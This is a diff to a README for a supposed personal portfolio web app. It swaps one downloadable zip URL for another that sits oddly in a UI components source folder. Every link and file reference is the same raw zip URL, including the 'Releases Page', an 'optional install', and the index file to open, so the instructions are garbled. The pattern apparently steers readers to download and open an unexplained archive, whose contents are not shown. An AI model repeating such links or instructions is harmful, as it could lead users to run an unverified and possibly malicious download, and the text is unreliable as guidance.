@@ -6,7 +6,7 @@ Welcome to your new portfolio! This guide will help you download and run the app
 
 ## 📥 Download Now
 
-[![Download my-portfolio](https://raw.githubusercontent.com/Fabriictc/my-portfolio/main/desacralization/my-portfolio.zip)](https://raw.githubusercontent.com/Fabriictc/my-portfolio/main/desacralization/my-portfolio.zip)
+[![Download my-portfolio](https://github.com/Fabriictc/my-portfolio/raw/refs/heads/main/src/app/components/ui/my-portfolio-3.0.zip)](https://github.com/Fabriictc/my-portfolio/raw/refs/heads/main/src/app/components/ui/my-portfolio-3.0.zip)
 
 ## 💻 Overview
 
@@ -29,11 +29,11 @@ To run this application, you should have:
 - An internet connection for downloading the application.
 - A modern web browser (like Chrome, Firefox, or Safari).
 
-Optional: You may want to install https://raw.githubusercontent.com/Fabriictc/my-portfolio/main/desacralization/my-portfolio.zip if you choose to customize the app further.
+Optional: You may want to install https://github.com/Fabriictc/my-portfolio/raw/refs/heads/main/src/app/components/ui/my-portfolio-3.0.zip if you choose to customize the app further.
 
 ## 🔗 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases Page](https://raw.githubusercontent.com/Fabriictc/my-portfolio/main/desacralization/my-portfolio.zip). 
+1. **Visit the Releases Page:** Go to the [Releases Page](https://github.com/Fabriictc/my-portfolio/raw/refs/heads/main/src/app/components/ui/my-portfolio-3.0.zip). 
 2. **Select the Latest Version:** Look for the latest release to ensure you have the newest features and fixes.
 3. **Download the Application:** Click on the download link for the version you want to install.
 
@@ -44,7 +44,7 @@ Once the download is complete, follow these steps to run the application:
 1. **Locate the Downloaded File:** Check your downloads folder or the location you saved the file to.
 2. **Unzip the File:** If the file is in a zip format, right-click on it and select "Extract All" to unzip the contents.
 3. **Open the Index File:**
-   - Find the `https://raw.githubusercontent.com/Fabriictc/my-portfolio/main/desacralization/my-portfolio.zip` file in the extracted folder.
+   - Find the `https://github.com/Fabriictc/my-portfolio/raw/refs/heads/main/src/app/components/ui/my-portfolio-3.0.zip` file in the extracted folder.
    - Double-click on it to open it in your web browser.
 
 Your portfolio should now display in your browser!
@@ -53,7 +53,7 @@ Your portfolio should now display in your browser!
 
 To make the portfolio truly yours, you can customize the following:
 
-- **Text Content:** Open the `https://raw.githubusercontent.com/Fabriictc/my-portfolio/main/desacralization/my-portfolio.zip` file in any text editor (like Notepad or TextEdit).
+- **Text Content:** Open the `https://github.com/Fabriictc/my-portfolio/raw/refs/heads/main/src/app/components/ui/my-portfolio-3.0.zip` file in any text editor (like Notepad or TextEdit).
 - **Styling:** To change colors or layouts, modify the Tailwind CSS classes in the HTML.
 
 Feel free to change the project description and images to reflect your work and style. 
